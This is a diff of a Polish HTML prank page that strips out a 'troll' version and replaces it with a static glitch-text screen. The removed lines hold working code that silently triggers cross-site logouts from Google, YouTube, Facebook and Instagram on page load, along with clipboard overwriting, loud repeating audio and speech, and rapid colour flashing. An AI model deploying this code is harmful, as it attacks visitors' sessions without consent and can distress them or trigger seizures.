@@ -1,186 +1,45 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ptoszek Ultimate Troll</title>
-  <meta name="theme-color" content="#ff0000">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      background-color: black;
-      color: white;
-      font-family: monospace;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>???</title>
+<style>
+    body {
+        background: black;
+        color: #0f0;
+        font-family: 'Courier New', monospace;
+        overflow: hidden;
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
     }
-    .hello-message {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 2em;
-      text-align: center;
-      z-index: 9999;
+    .glitch {
+        font-size: 3em;
+        position: relative;
+        animation: glitch 1s infinite;
     }
-    .logout-messages {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      z-index: 9999;
-      color: yellow;
-      font-size: 0.9em;
+    @keyframes glitch {
+        0% { left: 0px; top: 0px; }
+        20% { left: 2px; top: -2px; }
+        40% { left: -2px; top: 2px; }
+        60% { left: 2px; top: 2px; }
+        80% { left: -2px; top: -2px; }
+        100% { left: 0px; top: 0px; }
     }
-  </style>
+    p {
+        margin-top: 20px;
+        font-size: 1.2em;
+        color: #0f0;
+        opacity: 0.7;
+    }
+</style>
 </head>
 <body>
-
-  <div class="hello-message">
-    Witaj na stronie ptoszka! 😎<br>
-    Nie klikaj nic, bo będzie się działo…
-  </div>
-
-  <div class="logout-messages"></div>
-
-  <script>
-  // --- SETTINGS ---
-  const NUM_PARTICLES = 100;
-  const AUDIO_FILES = [
-    'https://interactive-examples.mdn.mozilla.net/media/examples/t-rex-roar.mp3',
-    'https://interactive-examples.mdn.mozilla.net/media/examples/horse.ogg'
-  ];
-  const ART = ['🐦','🦉','🦆','🦢','🦜'];
-  const SCREEN_WIDTH = window.innerWidth;
-  const SCREEN_HEIGHT = window.innerHeight;
-
-  // --- SUPER LOGOUT ---
-  const LOGOUT_SITES = {
-    Google: ['GET', 'https://www.google.com/accounts/Logout'],
-    YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
-    Facebook: ['GET', 'https://www.facebook.com/logout.php'],
-    Instagram: ['GET', 'https://www.instagram.com/accounts/logout/']
-  };
-
-  function superLogout() {
-    function get(url) {
-      const img = document.createElement('img');
-      img.onload = img.onerror = () => img.remove();
-      img.style.position = 'fixed';
-      img.style.width = '1px';
-      img.style.height = '1px';
-      img.style.top = '-10px';
-      img.style.left = '-10px';
-      document.body.appendChild(img);
-      img.src = url;
-    }
-
-    function post(url, params) {
-      const iframe = document.createElement('iframe');
-      iframe.style.position = 'fixed';
-      iframe.style.width = '1px';
-      iframe.style.height = '1px';
-      iframe.style.top = '-10px';
-      iframe.style.left = '-10px';
-      document.body.appendChild(iframe);
-
-      const form = document.createElement('form');
-      form.style.display = 'none';
-      form.action = url;
-      form.method = 'POST';
-      form.target = iframe.name = 'iframe'+Math.random();
-
-      for(const key in params){
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = params[key];
-        form.appendChild(input);
-      }
-
-      document.body.appendChild(form);
-      form.submit();
-    }
-
-    for(const name in LOGOUT_SITES){
-      const method = LOGOUT_SITES[name][0];
-      const url = LOGOUT_SITES[name][1];
-      const params = LOGOUT_SITES[name][2] || {};
-      if(method==='GET') get(url); else post(url, params);
-
-      const div = document.createElement('div');
-      div.innerText = `Wylogowywanie z ${name}...`;
-      document.querySelector('.logout-messages').appendChild(div);
-    }
-  }
-
-  // --- FLYING ELEMENTS ---
-  const particles = [];
-  for(let i=0;i<NUM_PARTICLES;i++){
-    const el = document.createElement('div');
-    el.innerText = ART[Math.floor(Math.random()*ART.length)];
-    el.style.position = 'fixed';
-    el.style.left = Math.random()*SCREEN_WIDTH+'px';
-    el.style.top = Math.random()*SCREEN_HEIGHT+'px';
-    el.style.fontSize = 20 + Math.random()*40 + 'px';
-    el.style.zIndex = 9999;
-    document.body.appendChild(el);
-    particles.push({el,vx:(Math.random()-0.5)*15,vy:(Math.random()-0.5)*15});
-  }
-
-  function animateParticles(){
-    particles.forEach(p=>{
-      let x=parseFloat(p.el.style.left);
-      let y=parseFloat(p.el.style.top);
-      x+=p.vx; y+=p.vy;
-      if(x<0||x>SCREEN_WIDTH-50)p.vx*=-1;
-      if(y<0||y>SCREEN_HEIGHT-50)p.vy*=-1;
-      p.el.style.left=x+'px';
-      p.el.style.top=y+'px';
-    });
-    requestAnimationFrame(animateParticles);
-  }
-  animateParticles();
-
-  // --- RANDOM AUDIO ---
-  function playRandomSound(){
-    const audio = new Audio(AUDIO_FILES[Math.floor(Math.random()*AUDIO_FILES.length)]);
-    audio.volume = 1;
-    audio.play().catch(()=>{});
-  }
-  setInterval(playRandomSound, 1000);
-
-  // --- RAINBOW BACKGROUND ---
-  function rainbowBackground(){
-    document.body.style.backgroundColor = '#'+Math.floor(Math.random()*16777215).toString(16);
-  }
-  setInterval(rainbowBackground, 100);
-
-  // --- SHAKE EFFECT ---
-  function shakeBody(){
-    document.body.style.transform = `translate(${(Math.random()-0.5)*20}px, ${(Math.random()-0.5)*20}px)`;
-  }
-  setInterval(shakeBody, 50);
-
-  // --- CLIPBOARD SPAM ---
-  const spamText = 'Zostałeś zptoszkowany!!1 '.repeat(100);
-  navigator.clipboard.writeText(spamText).catch(()=>{});
-
-  // --- TEXT-TO-SPEECH ---
-  const phrases = [
-    "Hello, my name is ptoszek!",
-    "Birds are funny!",
-    "Zostałeś zptoszkowany!"
-  ];
-  function speakRandom(){
-    const msg = new SpeechSynthesisUtterance(phrases[Math.floor(Math.random()*phrases.length)]);
-    window.speechSynthesis.speak(msg);
-  }
-  setInterval(speakRandom, 5000);
-
-  // --- INIT ---
-  window.addEventListener('load', ()=>{
-    superLogout();
-  });
-  </script>
+    <div class="glitch">███████</div>
+    <p>Coś tu jest… ale czy naprawdę?</p>
 </body>
 </html>
